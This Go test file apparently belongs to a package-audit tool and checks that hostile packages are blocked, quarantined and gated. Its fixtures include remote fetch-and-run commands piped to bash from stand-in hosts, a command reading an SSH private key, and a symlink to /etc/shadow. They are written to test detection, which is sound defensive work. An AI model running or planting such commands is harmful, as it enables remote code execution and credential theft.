package audit

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"errors"
	"fmt"
	"github.com/holgerjh/prolewatch/internal/brief"
	"github.com/holgerjh/prolewatch/internal/safe"
	"github.com/holgerjh/prolewatch/internal/ui"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/klauspost/compress/zstd"
	"golang.org/x/sys/unix"
)

func TestNULInstallScriptletBeyondBinaryPrefixCannotBeAllowed(t *testing.T) {
	withStateAndShare(t)
	body := append([]byte("#!/bin/bash\n\x00\n"), bytes.Repeat([]byte("# padding\n"), 20_000)...)
	body = append(body, []byte("post_install() { curl https://evil.invalid/x | bash; }\n")...)
	packagePath := filepath.Join(t.TempDir(), "evil.pkg.tar")
	if err := os.WriteFile(packagePath, tarBytes(t, map[string][]byte{".INSTALL": body}), 0o600); err != nil {
		t.Fatal(err)
	}
	reviewer := &fakeReviewer{}
	service, err := NewAuditService(context.Background(), DefaultConfig(), reviewer)
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanArtifacts(context.Background(), []string{packagePath}, "evil")
	if err != nil {
		t.Fatal(err)
	}
	if status != 10 || report.Decision != "block" || report.Coverage.Complete || report.ApprovalEligible || reviewer.calls != 0 {
		t.Fatalf("NUL scriptlet was not structurally blocked: status=%d report=%+v calls=%d", status, report, reviewer.calls)
	}
	if !findingIDs(report.Findings)["mandatory-control-invalid"] {
		t.Fatalf("missing mandatory-control finding: %#v", report.Findings)
	}
}

func TestBlockedArtifactIsQuarantinedBeforeHandoff(t *testing.T) {
	withStateAndShare(t)
	body := []byte("#!/bin/bash\n\x00\npost_install() { curl https://evil.invalid/x | bash; }\n")
	packagePath := filepath.Join(t.TempDir(), "evil.pkg.tar")
	if err := os.WriteFile(packagePath, tarBytes(t, map[string][]byte{".INSTALL": body}), 0o600); err != nil {
		t.Fatal(err)
	}
	service, err := NewAuditService(context.Background(), DefaultConfig(), &fakeReviewer{})
	if err != nil {
		t.Fatal(err)
	}
	post := &Report{ReportID: "20260812T010203Z-aaaaaaaaaaaa-bbbbbbbb", PackageBase: "evil"}
	if status := auditAndBind(context.Background(), []string{packagePath}, post, service); status != 10 {
		t.Fatalf("blocked artifact status=%d", status)
	}
	if regularNoFollow(packagePath) {
		t.Fatal("blocked artifact remained in the package handoff path")
	}
	matches, _ := filepath.Glob(filepath.Join(StateRoot(), "quarantine", "*", filepath.Base(packagePath)))
	if len(matches) != 1 || !regularNoFollow(matches[0]) {
		t.Fatalf("blocked artifact was not quarantined: %#v", matches)
	}
}

func TestSourcedExtensionlessHelperWithNULIsMandatory(t *testing.T) {
	root := t.TempDir()
	writePackageFixture(t, root)
	pkg := "pkgbase=demo\npkgver=1\npkgrel=1\nsource=(local.patch)\nsource \"${srcdir}/helper\"\n"
	if err := os.WriteFile(filepath.Join(root, "PKGBUILD"), []byte(pkg), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "helper"), []byte("echo ok\x00\necho hidden\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	inv, err := brief.NewScanner(BriefConfig(DefaultConfig())).ScanDirectory(root, "pre")
	if err != nil {
		t.Fatal(err)
	}
	if inv.Coverage.Complete || !findingIDs(inv.Findings)["mandatory-control-invalid"] {
		t.Fatalf("active helper was not blocked: %+v %#v", inv.Coverage, inv.Findings)
	}
}

func TestPrivilegedIntegrationMembersAreAlwaysSelected(t *testing.T) {
	raw := tarBytes(t, map[string][]byte{
		"usr/lib/systemd/system/demo.timer":  []byte("[Timer]\nOnBootSec=1\n"),
		"usr/lib/udev/rules.d/99-demo.rules": []byte("ACTION==\"add\", TAG+=\"systemd\"\n"),
		"usr/share/libalpm/hooks/demo.hook":  []byte("[Trigger]\nOperation=Install\n"),
	})
	result := brief.ScanArchive(bytes.NewReader(raw), "demo.pkg.tar", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
	selected := map[string]bool{}
	for _, content := range result.Selected {
		selected[content.Path] = true
	}
	for _, name := range []string{"demo.pkg.tar!/usr/lib/systemd/system/demo.timer", "demo.pkg.tar!/usr/lib/udev/rules.d/99-demo.rules", "demo.pkg.tar!/usr/share/libalpm/hooks/demo.hook"} {
		if !selected[name] {
			t.Errorf("privileged content omitted: %s", name)
		}
	}
}

func TestArchiveLinksDevicesOwnershipAndModesFailClosed(t *testing.T) {
	var raw bytes.Buffer
	writer := tar.NewWriter(&raw)
	headers := []*tar.Header{
		{Name: "dev/evil", Typeflag: tar.TypeChar, Devmajor: 1, Devminor: 3},
		{Name: "usr/lib/link", Typeflag: tar.TypeSymlink, Linkname: "/etc/shadow"},
		{Name: "usr/lib/hard", Typeflag: tar.TypeLink, Linkname: "../escape"},
		{Name: "usr/bin/setid", Typeflag: tar.TypeReg, Mode: 0o4755, Uid: 1000, Gid: 1000, Size: 4},
	}
	for _, header := range headers {
		if err := writer.WriteHeader(header); err != nil {
			t.Fatal(err)
		}
		if header.Size > 0 {
			_, _ = writer.Write([]byte("data"))
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	result := brief.ScanArchive(bytes.NewReader(raw.Bytes()), "hostile.pkg.tar", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
	ids := findingIDs(result.Findings)
	if !ids["archive-escape"] || !ids["archive-owner"] || !ids["artifact-setid"] {
		t.Fatalf("archive structural metadata was not rejected: %#v", result.Findings)
	}
}

func TestSourceArchiveOwnershipDoesNotImplyInstalledOwnership(t *testing.T) {
	var raw bytes.Buffer
	writer := tar.NewWriter(&raw)
	body := []byte("source\n")
	if err := writer.WriteHeader(&tar.Header{Name: "README", Typeflag: tar.TypeReg, Mode: 0o644, Uid: 1000, Gid: 1000, Size: int64(len(body))}); err != nil {
		t.Fatal(err)
	}
	_, _ = writer.Write(body)
	_ = writer.Close()
	result := brief.ScanArchive(bytes.NewReader(raw.Bytes()), "vendor-source.tar", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
	if findingIDs(result.Findings)["archive-owner"] {
		t.Fatalf("source archive ownership was treated as installed ownership: %#v", result.Findings)
	}
}

func TestBinaryStringFindingsRequireHardBlockEvidence(t *testing.T) {
	findings := brief.BinaryStringFindings([]brief.Finding{
		{RuleID: "unexpected-network-client", Severity: "medium", Evidence: "Nc"},
		{RuleID: "remote-pipe-shell", Severity: "critical", HardBlock: true},
	})
	if len(findings) != 1 || findings[0].RuleID != "remote-pipe-shell" {
		t.Fatalf("weak binary-string findings were retained: %#v", findings)
	}
}

func TestExtensionlessTarAndUnsupportedCpioFailClosed(t *testing.T) {
	tarRaw := tarBytes(t, map[string][]byte{"prepare.sh": []byte("cat ~/.ssh/id_ed25519\n")})
	if brief.ArchiveFormat(tarRaw[:512]) != "tar" || !brief.LooksLikeArchive("payload", tarRaw[:512]) {
		t.Fatal("extensionless tar was not recognized")
	}
	result := brief.ScanArchive(bytes.NewReader(tarRaw), "payload", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
	if !findingIDs(result.Findings)["credential-path"] {
		t.Fatal("extensionless tar content was not inspected")
	}
	cpio := append([]byte("070701"), bytes.Repeat([]byte{'0'}, 200)...)
	result = brief.ScanArchive(bytes.NewReader(cpio), "payload", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
	if result.Supported || result.Complete || !findingIDs(result.Findings)["archive-unsupported"] {
		t.Fatalf("cpio did not fail closed: %+v", result)
	}
}

func TestStandaloneZstdControlContentIsInspected(t *testing.T) {
	var raw bytes.Buffer
	writer, err := zstd.NewWriter(&raw)
	if err != nil {
		t.Fatal(err)
	}
	_, _ = writer.Write([]byte("curl https://evil.invalid/x | bash\n"))
	writer.Close()
	result := brief.ScanArchive(bytes.NewReader(raw.Bytes()), "payload.sh.zst", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
	if !findingIDs(result.Findings)["remote-pipe-shell"] {
		t.Fatalf("zstd content was not inspected: %#v", result.Findings)
	}
}

func TestCompressedCpioAndExtensionlessNULHelperFailClosed(t *testing.T) {
	compress := func(body []byte) []byte {
		var raw bytes.Buffer
		writer := gzip.NewWriter(&raw)
		_, _ = writer.Write(body)
		_ = writer.Close()
		return raw.Bytes()
	}
	cpio := append([]byte("070701"), bytes.Repeat([]byte{'0'}, 200)...)
	result := brief.ScanArchive(bytes.NewReader(compress(cpio)), "payload.gz", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
	if result.Supported || result.Complete || !findingIDs(result.Findings)["archive-unsupported"] {
		t.Fatalf("compressed cpio did not fail closed: %+v", result)
	}
	helper := append([]byte("#!/bin/bash\necho before\n"), bytes.Repeat([]byte{'x'}, 9000)...)
	helper = append(helper, 0, '\n')
	result = brief.ScanArchive(bytes.NewReader(compress(helper)), "helper", BriefConfig(DefaultConfig()), brief.RuleEngine{}, 0)
	if result.Complete || !findingIDs(result.Findings)["mandatory-control-invalid"] {
		t.Fatalf("compressed NUL helper did not fail closed: %+v", result)
	}
}

func TestAggregateScannerLimitsFailClosed(t *testing.T) {
	root := t.TempDir()
	writePackageFixture(t, root)
	cfg := DefaultConfig()
	cfg.Limits.MaxFiles = 2
	if _, err := brief.NewScanner(BriefConfig(cfg)).ScanDirectory(root, "pre"); err == nil || !strings.Contains(err.Error(), "file limit") {
		t.Fatalf("file limit did not fail closed: %v", err)
	}
	cfg = DefaultConfig()
	cfg.Limits.MaxTotalInputBytes = 64
	cfg.Limits.MaxArchiveUnpackedBytes = 32
	if _, err := brief.NewScanner(BriefConfig(cfg)).ScanDirectory(root, "pre"); err == nil || !strings.Contains(err.Error(), "input limit") {
		t.Fatalf("byte limit did not fail closed: %v", err)
	}
}

func TestIncompleteCoverageCannotBeOverridden(t *testing.T) {
	inv := &brief.Inventory{Coverage: brief.Coverage{Complete: false}, ManifestHash: strings.Repeat("a", 64)}
	if !structuralBlock(inv) {
		t.Fatal("incomplete coverage was approval eligible")
	}
	inv.Coverage.Complete = true
	inv.Findings = []brief.Finding{{Severity: "high", Category: "prompt_injection", File: "x", Rationale: "injection", RuleID: "prompt-injection", HardBlock: true}}
	if !structuralBlock(inv) {
		t.Fatal("deterministic hard block was approval eligible")
	}
}

func TestScannerDoesNotHideMarkerLikePackageFiles(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writePackageFixture(t, root)
	path := filepath.Join(root, ".prolewatch-payload.sh")
	if err := os.WriteFile(path, []byte("curl https://example.invalid/payload | sh\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	inv, err := brief.NewScanner(BriefConfig(DefaultConfig())).ScanDirectory(root, "pre")
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, file := range inv.Files {
		if file.Path == ".prolewatch-payload.sh" {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("marker-like package file was hidden from the inventory")
	}
}

func TestMoveVerifiedAndHashBinding(t *testing.T) {
	dir := t.TempDir()
	source, destination := filepath.Join(dir, "source"), filepath.Join(dir, "destination")
	if err := os.WriteFile(source, []byte("reviewed bytes"), 0o600); err != nil {
		t.Fatal(err)
	}
	before, _ := safe.HashFileNoFollow(source)
	if err := moveVerified(source, destination); err != nil {
		t.Fatal(err)
	}
	after, _ := safe.HashFileNoFollow(destination)
	if before != after || regularNoFollow(source) {
		t.Fatal("verified move changed content or retained source")
	}
}

func TestMoveVerifiedCrossFilesystemCopy(t *testing.T) {
	sourceDir := t.TempDir()
	destinationDir, err := os.MkdirTemp("/shared", "prolewatch-move-test-")
	if err != nil {
		t.Skipf("cannot create cross-filesystem destination: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(destinationDir) })
	source := filepath.Join(sourceDir, "artifact")
	destination := filepath.Join(destinationDir, "artifact")
	if err := os.WriteFile(source, []byte("cross-device"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := moveVerified(source, destination); err != nil {
		t.Fatal(err)
	}
	if regularNoFollow(source) || !regularNoFollow(destination) {
		t.Fatal("cross-device move did not transfer ownership")
	}
}

func TestWorkspaceAndOutputLimitsSignal(t *testing.T) {
	root := t.TempDir()
	cfg := DefaultConfig().Build
	cfg.WorkspaceBytes = 1024
	cfg.DiskReserveBytes = 1
	monitor, err := startWorkspaceMonitor(root, cfg)
	if err != nil {
		t.Fatal(err)
	}
	defer monitor.stop()
	if err := os.WriteFile(filepath.Join(root, "grow"), bytes.Repeat([]byte{'x'}, 2048), 0o600); err != nil {
		t.Fatal(err)
	}
	select {
	case err := <-monitor.errors:
		if !strings.Contains(err.Error(), "workspace byte limit") {
			t.Fatal(err)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("workspace monitor did not signal")
	}
	overflow := make(chan error, 1)
	observed := false
	writer := &notifyingBuffer{buffer: safe.NewLimitedBuffer(4), errors: overflow, observer: func(commandOutputStream, []byte) { observed = true }}
	if _, err := writer.Write([]byte("12345")); err == nil {
		t.Fatal("output overflow accepted")
	}
	if observed {
		t.Fatal("overflowing subprocess output reached the live observer")
	}
	if err := <-overflow; err == nil {
		t.Fatal("output overflow was not signaled")
	}
}

func TestWorkspaceWatchRaceClassification(t *testing.T) {
	for _, err := range []error{
		fs.ErrNotExist,
		fs.ErrPermission,
		unix.ESTALE,
		fmt.Errorf("wrapped: %w", fs.ErrPermission),
	} {
		if !transientWorkspaceWatchError(err) {
			t.Errorf("transient workspace watch error was not recognized: %v", err)
		}
	}
	for _, err := range []error{unix.ENOSPC, unix.EMFILE, errors.New("unexpected watch failure")} {
		if transientWorkspaceWatchError(err) {
			t.Errorf("persistent workspace watch failure was ignored: %v", err)
		}
	}
	root := "/workspace"
	for _, err := range []error{fs.ErrNotExist, unix.ESTALE, fmt.Errorf("wrapped: %w", fs.ErrNotExist)} {
		if !transientWorkspaceAccountingError(root, filepath.Join(root, "src", "removed"), err) {
			t.Errorf("workspace replacement race was not recognized: %v", err)
		}
	}
	for _, current := range []string{root, filepath.Join(root, "src")} {
		err := fs.ErrPermission
		if current == root {
			err = fs.ErrNotExist
		}
		if transientWorkspaceAccountingError(root, current, err) {
			t.Errorf("unsafe accounting error was treated as transient: path=%s err=%v", current, err)
		}
	}
}

func TestWorkspaceMonitorAcceptsOnlyMakepkgLockedPackageDirectory(t *testing.T) {
	cfg := DefaultConfig().Build
	cfg.WorkspaceBytes = 1024
	cfg.DiskReserveBytes = 1
	root := t.TempDir()
	pkg := filepath.Join(root, "pkg")
	if err := os.Mkdir(pkg, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(pkg, 0o111); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(pkg, 0o755) })
	monitor, err := startWorkspaceMonitor(root, cfg)
	if err != nil {
		t.Fatalf("makepkg write-locked pkg directory blocked accounting: %v", err)
	}
	defer monitor.stop()
	if err := os.Chmod(pkg, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(pkg, "grow"), bytes.Repeat([]byte{'x'}, 2048), 0o600); err != nil {
		t.Fatal(err)
	}
	select {
	case err := <-monitor.errors:
		if !strings.Contains(err.Error(), "workspace byte limit") {
			t.Fatal(err)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("workspace accounting did not resume after makepkg unlocked pkg")
	}

	otherRoot := t.TempDir()
	hidden := filepath.Join(otherRoot, "hidden")
	if err := os.Mkdir(hidden, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(hidden, 0o111); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(hidden, 0o755) })
	if unexpected, err := startWorkspaceMonitor(otherRoot, cfg); err == nil {
		unexpected.stop()
		t.Fatal("non-makepkg unreadable directory bypassed workspace accounting")
	}
}

func TestSystemPathValidation(t *testing.T) {
	if _, err := openRootOwnedPath("/tmp", true); err == nil {
		t.Fatal("world-writable system path accepted")
	}
	if err := validateMakepkgConfig("/tmp/makepkg.conf"); err == nil {
		t.Fatal("out-of-policy makepkg config accepted")
	}
}

func TestProviderAttestationBinding(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	metadata := ProviderMetadata{Provider: "codex", Transport: "cli", RuntimeVersion: "test", Model: "gpt", Effort: "high", AdapterPolicy: "test"}
	provider := brief.ToolIdentity{Path: "/usr/bin/codex", Version: "test", SHA256: strings.Repeat("a", 64)}
	archive := brief.ToolIdentity{Path: "/usr/bin/bsdtar", Version: "test", SHA256: strings.Repeat("b", 64)}
	fingerprint := strings.Repeat("c", 64)
	if err := saveProviderAttestation(fingerprint, metadata, provider, archive, CanaryChecks{EmptyWorkspace: true, NoHostRead: true, PromptInjectionRecognised: true}); err != nil {
		t.Fatal(err)
	}
	if err := loadProviderAttestation(fingerprint, metadata, provider, archive); err != nil {
		t.Fatal(err)
	}
	if err := loadProviderAttestation(strings.Repeat("d", 64), metadata, provider, archive); err == nil {
		t.Fatal("stale provider attestation accepted")
	}
}

func TestRealAuditServiceRequiresAndAcceptsBoundAttestation(t *testing.T) {
	withStateAndShare(t)
	previousFactory, previousCodex := reviewClientFactory, codexHostBinary
	defer func() { reviewClientFactory, codexHostBinary = previousFactory, previousCodex }()
	reviewer := &fakeReviewer{}
	reviewClientFactory = func(Config) ReviewClient { return reviewer }
	codexHostBinary = writeExecutable(t, "echo codex")
	cfg := DefaultConfig()
	cfg.Review.Mode = ReviewModeAI
	metadata, _ := reviewer.Probe(context.Background())
	archive, err := brief.ArchiveProbeIdentity(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	fingerprint, err := ComputePolicyFingerprint(cfg, metadata, archive)
	if err != nil {
		t.Fatal(err)
	}
	provider, err := providerBinaryIdentity(context.Background(), cfg, metadata)
	if err != nil {
		t.Fatal(err)
	}
	// AI review is enrichment, so a missing attestation must not block an
	// install. It must disable the reviewer: attestation binds the provider
	// binary's identity to this policy, so without it nothing establishes that
	// verdicts came from the configured reviewer. Degrading must not quietly
	// widen what an optional component is allowed to contribute.
	degraded, err := NewAuditService(context.Background(), cfg, nil)
	if err != nil {
		t.Fatalf("a missing attestation blocked the service: %v", err)
	}
	if degraded.Reviewer != nil {
		t.Fatal("an unattested provider was kept as the reviewer")
	}
	if !strings.Contains(degraded.InitializationError, "attestation") {
		t.Fatalf("the briefing would not say why AI review is absent: %q", degraded.InitializationError)
	}
	if err := saveProviderAttestation(fingerprint, metadata, provider, archive, CanaryChecks{EmptyWorkspace: true, NoHostRead: true, PromptInjectionRecognised: true}); err != nil {
		t.Fatal(err)
	}
	service, err := NewAuditService(context.Background(), cfg, nil)
	if err != nil || service.PolicyFingerprint != fingerprint {
		t.Fatalf("bound provider attestation was rejected: %+v %v", service, err)
	}
}

func TestResourceDefaultsAndDispatcherFailClosed(t *testing.T) {
	effective := effectiveBuildLimits(DefaultConfig().Build)
	if effective.MemoryBytes <= 0 || effective.CPUCount <= 0 || effective.TasksMax != 512 || effective.NetworkPolicy != "isolated" {
		t.Fatalf("invalid effective resource limits: %+v", effective)
	}
	var stdout, stderr bytes.Buffer
	status := runProviderWorker(context.Background(), strings.NewReader("{}"), &stdout, &stderr)
	if status == 0 || stderr.Len() == 0 {
		t.Fatalf("invalid dispatcher invocation did not fail closed: %d", status)
	}
}

func TestSandboxEnforcementSchemaRejectsInvalidRecords(t *testing.T) {
	valid := effectiveBuildLimits(DefaultConfig().Build)
	if err := valid.Validate(); err != nil {
		t.Fatal(err)
	}
	processExit := valid
	processExit.Termination = "process-exit"
	if err := processExit.Validate(); err != nil {
		t.Fatalf("process exit termination was rejected: %v", err)
	}
	mutations := []func(*SandboxEnforcement){
		func(s *SandboxEnforcement) { s.MemoryBytes = 0 },
		func(s *SandboxEnforcement) { s.NetworkPolicy = "host" },
		func(s *SandboxEnforcement) { s.Termination = "unknown" },
	}
	for index, mutate := range mutations {
		candidate := valid
		mutate(&candidate)
		if err := candidate.Validate(); err == nil {
			t.Errorf("sandbox enforcement mutation %d accepted", index)
		}
	}
}

func TestArchiveAndFindingBudgetErrors(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Limits.MaxFindings = 1
	result := &brief.ArchiveScan{Findings: []brief.Finding{{}, {}}}
	if err := brief.CheckArchiveBudget(result, BriefConfig(cfg)); err == nil {
		t.Fatal("archive finding budget accepted")
	}
	if !errors.Is(context.Canceled, context.Canceled) {
		t.Fatal("unreachable")
	}
}

// Automatic privileged integration requires an explicit gate decision; a
// redirected or missing terminal cannot silently keep it.
func TestAGateThatCannotAskStopsTheInstall(t *testing.T) {
	withStateAndShare(t)
	packagePath := filepath.Join(t.TempDir(), "surface.pkg.tar")
	body := []byte("post_install() { echo hello; }\n")
	if err := os.WriteFile(packagePath, tarBytes(t, map[string][]byte{".INSTALL": body}), 0o600); err != nil {
		t.Fatal(err)
	}
	service, err := NewAuditService(context.Background(), DefaultConfig(), &fakeReviewer{})
	if err != nil {
		t.Fatal(err)
	}
	previousPrompter, previousEnumerator := gatePrompter, gateEnumerator
	defer func() { gatePrompter, gateEnumerator = previousPrompter, previousEnumerator }()
	gateEnumerator = func(context.Context, string) ([]brief.PrivilegedSurface, error) {
		return []brief.PrivilegedSurface{{Member: ".INSTALL", Kind: "scriptlet"}}, nil
	}
	gatePrompter = func(string, []brief.PrivilegedSurface) (ui.GateDecision, error) {
		return ui.GateDecision{}, ui.ErrNoGateDecision
	}
	post := &Report{ReportID: "20260812T010203Z-aaaaaaaaaaaa-bbbbbbbb", PackageBase: "surface"}
	if status := auditAndBind(context.Background(), []string{packagePath}, post, service); status != 10 {
		t.Fatalf("an unanswered gate handed the package on: status=%d", status)
	}
}
